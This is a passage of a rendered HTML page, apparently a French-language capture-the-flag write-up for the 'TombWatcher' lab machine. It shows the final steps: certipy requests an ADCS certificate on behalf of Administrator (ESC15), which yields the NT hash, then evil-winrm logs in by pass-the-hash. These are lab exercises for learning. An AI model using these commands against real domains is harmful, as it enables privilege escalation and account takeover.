+        data-src="/images/TombWatcher/TombWatcher-1.png"
+        data-srcset="/images/TombWatcher/TombWatcher-1.png, /images/TombWatcher/TombWatcher-1.png 1.5x, /images/TombWatcher/TombWatcher-1.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/TombWatcher-1.png"
+        title="/images/TombWatcher/TombWatcher-1.png" width="1049" height="541" /></p>
+<p>Je fais une demande de certificat au nom de l&rsquo;administrateur à l&rsquo;aide du certificat de <code>cert_admin</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy req <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -u <span class="s1">&#39;cert_admin@tombwatcher.htb&#39;</span> -p <span class="s1">&#39;Password@2025&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span> -target <span class="s1">&#39;dc01.tombwatcher.htb&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -ca <span class="s1">&#39;tombwatcher-CA-1&#39;</span> -template <span class="s1">&#39;User&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -pfx <span class="s1">&#39;cert_admin.pfx&#39;</span> -on-behalf-of <span class="s1">&#39;tombwatcher\Administrator&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/TombWatcher-2.png"
+        data-srcset="/images/TombWatcher/TombWatcher-2.png, /images/TombWatcher/TombWatcher-2.png 1.5x, /images/TombWatcher/TombWatcher-2.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/TombWatcher-2.png"
+        title="/images/TombWatcher/TombWatcher-2.png" width="1057" height="531" /></p>
+<p>Je m&rsquo;authentifie avec le certificat de l&rsquo;administrateur. J&rsquo;obtiens alors sont hash NT.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy auth -pfx <span class="s1">&#39;administrator.pfx&#39;</span> -dc-ip <span class="s1">&#39;10.10.11.72&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/TombWatcher-3.png"
+        data-srcset="/images/TombWatcher/TombWatcher-3.png, /images/TombWatcher/TombWatcher-3.png 1.5x, /images/TombWatcher/TombWatcher-3.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/TombWatcher-3.png"
+        title="/images/TombWatcher/TombWatcher-3.png" width="1630" height="349" /></p>
+<h2 id="evil-winrm-1">Evil-WinRM</h2>
+<p>Je me connecte enfin à la machine en que l&rsquo;utilisateur <code>administrator</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.72 -u <span class="s1">&#39;administrator&#39;</span> -H <span class="s1">&#39;f61db423bebe3328d33af26741afe5fc&#39;</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TombWatcher/TombWatcher-4.png"
+        data-srcset="/images/TombWatcher/TombWatcher-4.png, /images/TombWatcher/TombWatcher-4.png 1.5x, /images/TombWatcher/TombWatcher-4.png 2x"
+        data-sizes="auto"
+        alt="/images/TombWatcher/TombWatcher-4.png"
+        title="/images/TombWatcher/TombWatcher-4.png" width="1191" height="362" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif"
+        data-srcset="https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif, https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif 1.5x, https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif 2x"
+        data-sizes="auto"
+        alt="https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif"
+        title="https://media1.tenor.com/m/rtptArIGDeUAAAAC/goat-chill.gif" /></p>
+<p>Merci d&rsquo;avoir lu ce writeup 😉.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/tombwatcher/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/tombwatcher/" data-title="TombWatcher" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,ESC15,ADCS,ReadGMSAPassword,ForceChangePassword,Targeted Kerberoasting,WriteOwner,WriteSPN"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/esc15/">ESC15</a>,&nbsp;<a href="/tags/adcs/">ADCS</a>,&nbsp;<a href="/tags/readgmsapassword/">ReadGMSAPassword</a>,&nbsp;<a href="/tags/forcechangepassword/">ForceChangePassword</a>,&nbsp;<a href="/tags/targeted-kerberoasting/">Targeted Kerberoasting</a>,&nbsp;<a href="/tags/writeowner/">WriteOwner</a>,&nbsp;<a href="/tags/writespn/">WriteSPN</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/trick/" class="prev" rel="prev" title="Trick"><i class="fas fa-angle-left" aria-hidden="true"></i>Trick</a>
+            <a href="/thefrizz/" class="next" rel="next" title="TheFrizz">TheFrizz<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
